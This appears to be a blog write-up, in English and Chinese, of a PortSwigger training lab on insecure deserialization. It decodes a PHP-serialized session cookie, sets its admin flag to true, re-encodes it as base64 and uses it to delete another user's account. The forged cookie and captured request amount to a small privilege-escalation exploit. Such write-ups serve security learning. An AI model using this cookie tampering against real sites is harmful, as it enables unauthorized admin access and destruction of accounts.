---
layout: post
title: "Modifying serialized objects"
description: ""
date: 2023-07-11
categories:
  - PortSwigger_Lab
  - PortSwigger_Insecure_Deserialization
author: ""
tags: ['PortSwigger_Lab', 'Insecure_Deserialization']
---





# Modifying serialized objects

```

This lab uses a serialization-based session mechanism and is vulnerable to privilege escalation as a result. To solve the lab, edit the serialized object in the session cookie to exploit this vulnerability and gain administrative privileges. Then, delete Carlos's account.

You can log in to your own account using the following credentials: `wiener:peter`


該實驗室使用基於序列化的會話機制，因此容易受到權限提升的影響。 要解決實驗室問題，請編輯會話 cookie 中的序列化對像以利用此漏洞並獲得管理權限。 然後，刪除 Carlos 的帳戶。

您可以使用以下憑據登錄到您自己的帳戶：`wiener:peter`



```



登入 -> update email  -> 抓包

```http

POST /my-account/change-email HTTP/1.1
Host: 0a3300f8036e55dec0bddf68002d005a.web-security-academy.net
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30=
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:106.0) Gecko/20100101 Firefox/106.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Origin: https://0a3300f8036e55dec0bddf68002d005a.web-security-academy.net
Referer: https://0a3300f8036e55dec0bddf68002d005a.web-security-academy.net/my-account?id=wiener
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

email=333%40333
```





base64:
```
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3d
```

實測 burpsuite proxy 模塊中直接反白，可以正確解碼。拿去decoder 模塊反而會解錯
原因在於最後面的 %3d 應該是url 編碼 = 不知道到底是怎樣(可以去掉)



或去online deocoder 也可以

```php
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
```


反序列化一下 
線上 https://www.unserialize.com/  選項選 var_dump 函數
```
object(__PHP_Incomplete_Class)#3 (3) {
  ["__PHP_Incomplete_Class_Name"]=>
  string(4) "User"
  
  ["username"]=>
  string(6) "wiener"
  
  ["admin"]=>
  bool(false)
}
```



看起來像一個 使用者是否為 admin 的描述


admin 修改為 1
```php
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}
```


然後再base64 加密
```
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30=
```


實測burpsuite 改包發送無法成功。

直接在 firefox  改 session 值。


成功出現
Admin panel  選項

刪除 Carlos


